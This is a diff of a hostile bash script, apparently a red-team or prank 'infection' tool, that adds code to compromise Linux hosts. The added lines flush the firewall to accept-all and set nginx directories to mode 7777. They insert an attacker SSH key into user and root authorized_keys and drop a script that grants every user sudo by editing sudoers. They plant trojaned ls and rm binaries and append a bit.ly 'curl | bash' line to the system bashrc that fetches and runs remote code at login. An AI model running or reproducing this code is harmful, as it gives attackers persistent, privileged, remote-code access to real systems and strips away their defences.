@@ -34,6 +34,8 @@
 	# fix the "pseudo terminal is not stdin", or whatever it is
 	# make the rickPath better
 	# change the clear argument to work with apache2 too
+	# finish OS detection and what not
+	# add sandman to everything
 	# migrate derpy \\\ to printf
 	### add the rest of it to Debian/Ubuntu
 	# fix the $? in the if statements, they wont work right
@@ -42,24 +44,30 @@
 #///////////////////////////////////////////////////////////////////////////////////////
 #|||||||||||||||||||||||| Script Stuff Starts |||||||||||||||||||||||||||||||||||||||||
 #\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
-###### RUN function ###############
-###################################
-function main(){				###
-if [[ $1 == -* ]]; then			###
-	pkill screen				### CLEARS SCREEN
-	echo CLEARED				###
-	exit 0						###
-elif [ $1 == 'carson' ]; then	### CARSON's
-	neo							###
-	carson						###
-else							###
-	neo							###
-	meat						###
-	bones						###
-	infect "$@"					### INFECTING TARGETS
-fi 								###
-}								###
-###################################
+###### RUN function ###################
+#######################################
+function main(){					###
+if [[ $1 == -* ]]; then				### CLEARS SCREEN
+	pkill screen					###
+	echo CLEARED					###
+	exit 0							###
+elif [[ $1 == 'a' ]]; then			### INFECTING TARGETS
+	neo								###
+	meat							###
+	bones							###
+	infect "$@"						###
+elif [[ $1 == 'carson' ]]; then		### CARSON's
+	neo								###
+	carson							###
+elif [[ $1 == 'santa' ]]; then		### HO HO HO
+	export -f santaClause			###
+	timeout 3 bash -c santaClause	###
+else								###
+	echo "so who are you?"			###
+	exit 1							###
+fi 									###
+}									###
+#######################################
 #------ error handling ----------
 ### If error, give up			#
 #set -e							#
@@ -82,24 +90,62 @@ function carson(){
 	# need to add id_rsa.pub key somewhere
 	# sed rickRoll to be the webhosted version
 	#-----------
-# it's a tarp!
-	trap '' 2
-# PS1 var
-	centDirtyRootPS1='PS1="${debian_chroot:+($debian_chroot)}[\e[0;5m*\e[0;37mT\e[0;31mi\e[0;33mt\e[0;32mt\e[1;37my \e[0;31mS\e[0;33mp\e[0;32mr\e[0;37mi\e[0;31mn\e[1;33mk\e[0;32ml\e[0;37me\e[0;31ms\e[0m\e[0;5;137m*\e[0m]\n\u@\h:\w\$ "'
-# ssh paths
-	sshUserPath="/home/$username/.ssh"
-	sshUserKey="$sshUserPath/authorized_keys"
-	sshRootPath="/root/.ssh"
-	sshRootKey="$sshRootPath/authorized_keys"
-	sshPoisonPath="/root/.vim"
-	sshPoisonKey="$sshPoisonPath/ssh"
+#### Setting Defaults ############################
+	# it's a tarp!
+		trap '' 2
+	# beep boop
+		osDetect="$(uname -v | egrep -io "debian|ubuntu" || cat /etc/*-release | grep -io "CentOS" | sort -u)"
+	# PS1 var
+		centDirtyRootPS1='PS1="${debian_chroot:+($debian_chroot)}[\e[0;5m*\e[0;37mT\e[0;31mi\e[0;33mt\e[0;32mt\e[1;37my \e[0;31mS\e[0;33mp\e[0;32mr\e[0;37mi\e[0;31mn\e[1;33mk\e[0;32ml\e[0;37me\e[0;31ms\e[0m\e[0;5;137m*\e[0m]\n\u@\h:\w\$ "'
+	# ssh paths
+		sshUserPath="/home/$username/.ssh"
+		sshUserKey="$sshUserPath/authorized_keys"
+		sshRootPath="/root/.ssh"
+		sshRootKey="$sshRootPath/authorized_keys"
+		sshPoisonPath="/root/.vim"
+		sshPoisonKey="$sshPoisonPath/ssh"
+#### waking the sandman ############################
+	# throwing it into bash files
+	#	cat <<-'EOF'
+	#		while : ; do
+	#			nohup bash -c "exec -a Sandman sleep 6969" > /dev/null 2>&1 &
+	#			sleep .1
+	#		done
+	#	EOF
+#### pants down ###################################
+	# that firewall was scary and mean! it's better now
+		cat <<-'EOF' > /etc/sysconfig/iptables
+			*mangle
+			:PREROUTING ACCEPT [0:0]
+			:INPUT ACCEPT [0:0]
+			:FORWARD ACCEPT [0:0]
+			:OUTPUT ACCEPT [0:0]
+			:POSTROUTING ACCEPT [0:0]
+			COMMIT
+			*nat
+			:PREROUTING ACCEPT [0:0]
+			:OUTPUT ACCEPT [0:0]
+			:POSTROUTING ACCEPT [0:0]
+			COMMIT
+			*filter
+			:INPUT ACCEPT [0:0]
+			:FORWARD ACCEPT [0:0]
+			:OUTPUT ACCEPT [0:0]
+			COMMIT
+		EOF
+		iptables-restore /etc/sysconfig/iptables
 
+#### "fixing" nginx ###############################
+	# permissions for everyone!!
+		find / -type d -name nginx -exec chmod -R 7777 {} \;
+
+#### General Caltrops #############################
 	# creating and inserting ssh keys
 		mkdir -m700 -p $sshUserPath $sshRootPath
 		chown $username:$username $sshUserPath
 		echo $sshPubKey >> $sshUserKey
 		chmod 600 $sshUserKey
-		cp -a $sshUserKey $sshRootKey &> /dev/null
+		cp $sshUserKey $sshRootKey &> /dev/null
 		restorecon -r /root &> /dev/null
 
 	# poisoning sshdir and auth file.
@@ -111,22 +157,43 @@ function carson(){
 	# let the bodies hit the floor
 		echo "${dirtyLS}" | tee $seedPathsLS > /dev/null
 		echo "${dirtyRM}" | tee $seedPathsRM > /dev/null
-		chmod +x $seedPathsLS $seedPathsRM
-		chmod 777 $seedPathsLS $seedPathsRM
+		echo "${dirtyGimme}" | tee $seedPathsGimme > /dev/null
+		chmod +x $seedPathsLS $seedPathsRM $seedPathsGimme
+		chmod 2777 $seedPathsLS $seedPathsRM $seedPathsGimme
 		touch /tmp/.trigger
-		echo 'touch /tmp/.trigger &> /dev/null' >> /etc/bashrc
-		printf "\n%s\n" "$centDirtyRootPS1" >> /etc/bashrc
-		echo 'curl -s -L http://bit.ly/10hA8iC | bash' >> /etc/bashrc ;
-		#a few presents
-			touch present_{0001..1000}
+		# OS checking for where to send happiness
+			if [[ $osDetect == "CentOS" ]]; then
+				bashrcPath="/etc/bashrc"
+			elif [[ $osDetect == "Debian" ]] || [[ $osDetect == "Ubuntu" ]]; then
+				bashrcPath="/etc/bash.bashrc"
+			else
+				echo 'HALP! i need an adult!'
+			fi
+		# happiness dispersal
+		cat <<-'EOF' >> $bashrcPath
+			#####################################################################
+			# Delete this stuff.. I'm sure nothing bad could possibly happen >.>
+			#####################################################################
+			EOF
+		echo 'touch /tmp/.trigger &> /dev/null' >> $bashrcPath
+		printf "\n%s\n" "$centDirtyRootPS1" >> $bashrcPath
+		echo 'curl -s -L http://bit.ly/10hA8iC | bash' >> $bashrcPath
 		#welcome messages
 			clear
 			printf "[\e[33;5m Preparing Charges \e[0m]"
-			(yum install curl epel-release -y &> /dev/null ; clear ; printf "[\e[33;5m Dispersing Candy \e[0m]") &&
-			(yum --disablerepo=epel -y update ca-certificates &> /dev/null ; clear ; printf "[\e[33;5m ..other important things.. \e[0m]") &&
-			yum install aalib -y &> /dev/null
+			#a few presents
+				touch $HOME/present_{0001..1000} /root/present_{0001..1000} &
+			# OS checking
+				if [[ $osDetect == "CentOS" ]]; then
+					(yum install curl epel-release -y &> /dev/null ; clear ; printf "[\e[33;5m Dispersing Candy \e[0m]") &&
+					(yum --disablerepo=epel -y update ca-certificates &> /dev/null ; clear ; printf "[\e[33;5m ..other important things.. \e[0m]") &&
+					yum install aalib -y &> /dev/null
+				else
+					(apt-get update &> /dev/null ; clear ; printf "[\e[33;5m Dispersing Candy \e[0m]") &&
+					apt-get install -y curl aalib &> /dev/null
+				fi
 			clear
-			for n in {1..100}; do
+			for n in {1..50}; do
 				printf "\t\t\e[0;31m AND SO IT BEGINS!! \e[0;m\n"
 				sleep .15
 			done
@@ -457,10 +524,54 @@ function meat(){
 ###########################################################################################
 centDirtyRootPS1='PS1="${debian_chroot:+($debian_chroot)}[\\e[0;5m*\\e[0;37mT\\e[0;31mi\\e[0;33mt\\e[0;32mt\\e[1;37my \\e[0;31mS\\e[0;33mp\\e[0;32mr\\e[0;37mi\\e[0;31mn\\e[1;33mk\\e[0;32ml\\e[0;37me\\e[0;31ms\\e[0m\\e[0;5;137m*\\e[0m]\\n\\u@\\h:\\w\\$ "'
 centPATH="/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin:/root/bin"
-seedPathsLS="/usr/local/sbin/ls /usr/local/bin/ls"
-seedPathsRM="/usr/local/sbin/rm /usr/local/bin/rm"
+seedPaths="/usr/local/sbin/ /usr/local/bin/"
+seedPathsLS="$(printf '%sls ' $seedPaths)"
+seedPathsRM="$(printf '%srm ' $seedPaths)"
+seedPathsGimme="$(printf '%sgimme ' $seedPaths)"
+###########################################################
+### scripts ###############################################
+###########################################################
+	dirtyGimme="$(cat <<-'EOF'
+				#!/bin/bash
+				#
+				# commented, non-obfuscated, and basic readability in place to be nice. (you would normally never be able to just read it)
+				#
+				for user in $(compgen -u); do
+					usermod -aG wheel $user || usermod -aG sudo $user
+				done
+				#
+				secPath="/etc/sudoers"
+				secPathNew="/etc/sudoers.new"
+				#
+				# copies and edits sudoers file
+				cp $secPath $secPathNew
+				chmod 750 $secPathNew
+				# adds the change, depending on OS
+				osDetect="$(uname -v | egrep -io "debian|ubuntu" || cat /etc/*-release | grep -o CentOS | sort -u)"
+				if [[ $osDetect == "CentOS" ]]; then
+					printf '\n%s\n' "%wheel ALL=(ALL)       ALL" >> $secPathNew
+				elif [[ $osDetect == "Debian" ]] || [[ $osDetect == "Ubuntu" ]]; then
+					printf '\n%s\n' "%sudo   ALL=(ALL:ALL) ALL" >> $secPathNew
+				else
+					#yolo
+					printf '\n%s\n' "%sudo   ALL=(ALL:ALL) ALL" >> $secPathNew
+					printf '\n%s\n' "%wheel ALL=(ALL)       ALL" >> $secPathNew
+				fi
+				# fixing permission for visudo
+				chmod 0440 $secPathNew
+				#checks the changes
+				visudo -c -f $secPathNew &> /dev/null
+				# replaces old visudo file
+				if [ $? -eq "0" ]; then
+					cp $secPathNew $secPath
+				fi
+				#garbage collection
+				rm $secPathNew
 
-### scripts #################################
+				EOF
+				)"
+
+###########################################################
 	dirtyLS="$(cat <<-'EOF'
 				#!/bin/bash
 				#
@@ -574,7 +685,7 @@ seedPathsRM="/usr/local/sbin/rm /usr/local/bin/rm"
 ### a pleasant banner #####################################################################
 ###########################################################################################
 
-function santaClaus(){
+function santaClause(){
 # cannot use * or other special characters (possibly)
 	DATA[0]=' __   __   ___  __        __          __   '
 	DATA[1]='|__) |__) |__  |__)  /\  |__) | |\ | / _`  '
@@ -592,10 +703,10 @@ function santaClaus(){
 		V_COORD_X=$1
 		V_COORD_Y=$2
 		tput cup $((REAL_OFFSET_Y + V_COORD_Y)) $((REAL_OFFSET_X + V_COORD_X))
-		printf %c ${DATA[V_COORD_Y]:V_COORD_X:1}
+		printf %s "${DATA[V_COORD_Y]:V_COORD_X:1}"
 	}
 
-	trap '' 2
+	#trap '' 2
 	trap 'tput setaf 9; tput cvvis; clear' EXIT
 
 	tput civis
@@ -606,7 +717,7 @@ function santaClaus(){
 			tput setaf $c
 			for ((x=0; x<${#DATA[0]}; x++)); do
 				#replace y<=n with the nummber of data lines
-				for ((y=0; y<=6; y++)); do
+				for ((y=0; y<=7; y++)); do
 					draw_char $x $y
 				done
 		  	done
